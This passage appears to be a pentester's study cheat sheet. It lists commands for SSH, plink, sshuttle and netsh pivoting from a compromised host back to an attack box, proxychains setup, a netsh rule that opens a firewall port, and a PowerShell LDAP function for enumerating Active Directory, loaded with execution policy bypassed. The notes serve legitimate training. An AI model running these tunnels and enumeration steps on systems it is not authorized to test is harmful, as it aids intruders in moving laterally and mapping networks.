##### Remote Port Forward
```bash
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```

##### Remote Dynamic Port Forward
```bash
ssh -N -R 9998 kali@192.168.118.4
```


## Proxychains config file

##### Local Dynamic Port Forward
```bash
# Last line
socks5 [Compromised endpoint w/ reverse shell] [port]
```

##### Remote Dynamic Port Forward
```bash
# Last line
socks5 127.0.0.1 [port]
```


## sshuttle

##### Setup Remote Port Forward, specifying the SSH connection string and subnets that we want to tunnel through
```bash
sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
```

## plink

##### Setup Remote Port Forward via SSH
```powershell
#		Step 1. Estabish SSH Tunnel from Remote
#
#[Attack Box] <<=========[SSH]========[+] [Remote]
#
#127.0.0.1:[port]					127.0.0.1:[port]
#		   [+]									 ^
#        	|____________________________________|
#        
#    Step 2. Reverse Forward Attack Box Port to Remote

# Example Commands
# ----------------
# Open 127.0.0.1:33060 on Attack Box
# Tunnel to 127.0.0.1:3306 on target
```

##### PW Authentication
```powershell
echo 'y' | .\plink.exe -ssh -l [attack_uname] -pw [attack_pw] -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attack-box-ip
```
	- Possibly `cmd.exe /c echo y`

##### Private key authentication
```powershell
echo 'y' | .\plink.exe -ssh -l [attack_uname] -i C:\Windows\Temp\key.pem -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 attack-box-ip
```
	- Possibly `cmd.exe /c echo y`
 
##### Multiple port forwards
```powershell
echo 'y' | .\plink.exe -ssh -l [attack_uname] -i C:\Windows\Temp\key.pem -batch -N -R 127.0.0.1:33060:127.0.0.1:3306 -R 127.0.0.1:4445:127.0.0.1:445 attack-box-ip
```
	- Possibly `cmd.exe /c echo y`


## netsh

##### Create Port Forward
```powershell
netsh interface portproxy add v4tov4 listenaddress=<local_IP> listenport=<local_port> connectaddress=<remote/internal_IP> connectport=<remote/internal_port>
```

##### List all port proxies/ port forwards
```powershell
netsh interface portproxy show all

netstat -anp TCP | find "<port>"
```

##### Add FW rule
```powershell
netsh advfirewall firewall add rule name="simple_name_port" protocol=TCP dir=in listenip=<local_ip> listenport=<local_port> action=allow
```


## ligolo


## chisel


# AD

## Enumeration

##### Function to query LDAP w/in cmdline
```powershell
function LDAPSearch {
    param (
        [string]$LDAPQuery
    )

    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName

    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")

    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()
}
```
	- To use:   `powershell -ep bypass`  `Import-Module .\enum.ps1`

##### Query all Domain users
```powershell
LDAPSearch -LDAPQuery "(samAccountType=805306368)"
```

##### Query Groups & their Members
```powershell
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) { $group.properties | select {$_.cn}, {$_.member} }
```

##### Store results in variable & query
```powershell
# Groups
$sales = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))"
$sales.properties.member

# Users
$mic = LDAPSearch -LDAPQuery "(&(objectCategory=user)(cn=michelle*))"
$mic.properties
```